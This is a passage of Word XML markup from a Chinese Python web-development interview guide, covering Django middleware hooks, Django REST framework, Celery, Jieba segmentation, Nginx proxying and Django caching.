        <w:t>4）处理响应后：视图函数调用之后，所有响应返回浏览器之前被调用，在每个请求上调用，返回HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52777F2B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="556" w:name="6730-1535455434257"/>
      <w:bookmarkEnd w:id="556"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_response(self， request， response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D566432" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="557" w:name="5560-1535455487405"/>
      <w:bookmarkEnd w:id="557"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064EA843" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="558" w:name="9370-1535455508096"/>
      <w:bookmarkEnd w:id="558"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5）异常处理：当视图抛出异常时调用，在每个请求上调用，返回一个 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1299BA81" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="559" w:name="8590-1535455517590"/>
      <w:bookmarkEnd w:id="559"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def process_exception(self， request，exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E94A821" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="560" w:name="3984-1535455518814"/>
      <w:bookmarkEnd w:id="560"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1802B57C" w14:textId="32CA35D8"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61" w:name="4396-1535455434420"/>
      <w:bookmarkStart w:id="562" w:name="1220-1535455533617"/>
      <w:bookmarkEnd w:id="561"/>
      <w:bookmarkEnd w:id="562"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>021</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有用过</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django REST framework </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>吗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF91211" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="563" w:name="4632-1535455434577"/>
      <w:bookmarkEnd w:id="563"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Django REST framework 是一个强大而灵活的 Web API 工具。使用  RESTframework  的理由有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0036DC9D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="564" w:name="6057-1535455545641"/>
      <w:bookmarkEnd w:id="564"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Web browsable API 对开发者有极大的好处包括 OAuth1a 和 OAuth2 的认证策略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BA1C9F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="565" w:name="5177-1535455545641"/>
      <w:bookmarkEnd w:id="565"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>支持 ORM 和非 ORM 数据资源的序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E8D256" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="566" w:name="7363-1535455545641"/>
      <w:bookmarkEnd w:id="566"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>全程自定义开发——如果不想使用更加强大的功能，可仅仅使用常规的 function-based views 额外的文档和强大的社区支持</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD9F58C" w14:textId="79CA59F9"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67" w:name="4138-1535455434719"/>
      <w:bookmarkStart w:id="568" w:name="8129-1535455567915"/>
      <w:bookmarkEnd w:id="567"/>
      <w:bookmarkEnd w:id="568"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>022</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Celery </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>分布式任务队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ADE091" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="569" w:name="1555-1535455578007"/>
      <w:bookmarkEnd w:id="569"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>情景：用户发起 request，并等待 response 返回。在本些 views 中，可能需要执行一段耗时的程序，那么用户就会等待很长时间，造成不好的用户体验，比如发送邮件、手机验证码等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048CD2F3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="570" w:name="7566-1535455580416"/>
      <w:bookmarkEnd w:id="570"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用 celery 后，情况就不一样了。解决：将耗时的程序放到 celery 中执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29857791" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="571" w:name="4884-1535455580416"/>
      <w:bookmarkEnd w:id="571"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将多个耗时的任务添加到队列 queue 中，也就是用 redis 实现 broker 中间人，然后用多个 worker 去监听队列里的任务去执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0048AD80" w14:textId="1F302BB0" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="572" w:name="1360-1535455592569"/>
      <w:bookmarkEnd w:id="572"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38B48CC4" wp14:editId="129CA9F1">
            <wp:extent cx="5305425" cy="12573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05425" cy="1257300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F34C756" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="573" w:name="2564-1535455578147"/>
      <w:bookmarkEnd w:id="573"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· 任务 task：就是一个 Python 函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D02528" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="574" w:name="7435-1535455601141"/>
      <w:bookmarkEnd w:id="574"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· 队列 queue：将需要执行的任务加入到队列中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2E3B96" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="575" w:name="4449-1535455601141"/>
      <w:bookmarkEnd w:id="575"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· 工人 worker：在一个新进程中，负责执行队列中的任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB0AAFA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="576" w:name="9196-1535455601141"/>
      <w:bookmarkEnd w:id="576"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· 代理人 broker：负责调度，在布置环境中使用 redis。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669C2F94" w14:textId="632BC01F"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77" w:name="2631-1535455609503"/>
      <w:bookmarkStart w:id="578" w:name="8239-1535455609898"/>
      <w:bookmarkEnd w:id="577"/>
      <w:bookmarkEnd w:id="578"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>023</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Jieba </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>分词</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DA3D3A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="579" w:name="2269-1535455612191"/>
      <w:bookmarkEnd w:id="579"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Jieba 分词支持三种分词模式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6B823C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="580" w:name="2425-1535455618913"/>
      <w:bookmarkEnd w:id="580"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>精确模式：试图将句子最精确地切开，适合文本分析；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6FF90E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="581" w:name="5600-1535455618913"/>
      <w:bookmarkEnd w:id="581"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>全模式：把句子中所有的可以成词的词语都扫描出来， 速度非常快，但是不能解决歧义；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B2964E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="582" w:name="3613-1535455618913"/>
      <w:bookmarkEnd w:id="582"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>搜索引擎模式：在精确模式的基础上，对长词再次切分，提高召回率，适合用于搜索引擎分词功能：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423D10DE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="583" w:name="1519-1535455618913"/>
      <w:bookmarkEnd w:id="583"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>分词，添加自定义词典，关键词提取，词性标注，并行分词，Tokenize：返回词语在原文的起始位置，ChineseAnalyzer for Whoosh 搜索引擎。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBCE905" w14:textId="0F005BE9"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84" w:name="9227-1535455578329"/>
      <w:bookmarkStart w:id="585" w:name="8060-1535455638073"/>
      <w:bookmarkEnd w:id="584"/>
      <w:bookmarkEnd w:id="585"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>024</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ngnix </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的正向代理与反向代理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59442C86" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="586" w:name="0060-1535455640943"/>
      <w:bookmarkEnd w:id="586"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>web 开发中，部署方式大致类似。简单来说，使用 Nginx 主要是为了实现分流、转发、负载均衡， 以及分担服务器的压力。Nginx  部署简单，内存消耗少，成本低。Nginx  既可以做正向代理，也可以做反向代理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276CE400" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="587" w:name="8238-1535455660380"/>
      <w:bookmarkEnd w:id="587"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正向代理：请求经过代理服务器从局域网发出，然后到达互联网上的服务器。特点：服务端并不知道真正的客户端是谁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1773AD3E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="588" w:name="5554-1535455660380"/>
      <w:bookmarkEnd w:id="588"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>反向代理：请求从互联网发出，先进入代理服务器，再转发给局域网内的服务器。特点：客户端并不知道真正的服务端是谁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC9E3D0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="589" w:name="6411-1535455660380"/>
      <w:bookmarkEnd w:id="589"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>区别：正向代理的对象是客户端。反向代理的对象是服务端。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B35768F" w14:textId="27D9048F"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90" w:name="1224-1535455673726"/>
      <w:bookmarkStart w:id="591" w:name="1654-1535455682876"/>
      <w:bookmarkEnd w:id="590"/>
      <w:bookmarkEnd w:id="591"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>025</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简述</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> Django </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>下的（内建的）缓存机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D12172D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="592" w:name="5267-1535455685607"/>
      <w:bookmarkEnd w:id="592"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个动态网站的基本权衡点就是，它是动态的。 每次用户请求页面，服务器会重新计算。从开销处理的角度来看，这比你读取一个现成的标准文件的代价要昂贵的多。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A100145" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="593" w:name="4897-1535455695644"/>
      <w:bookmarkEnd w:id="593"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这就是需要缓存的地方。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030DB1E0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="594" w:name="3742-1535455695644"/>
      <w:bookmarkEnd w:id="594"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
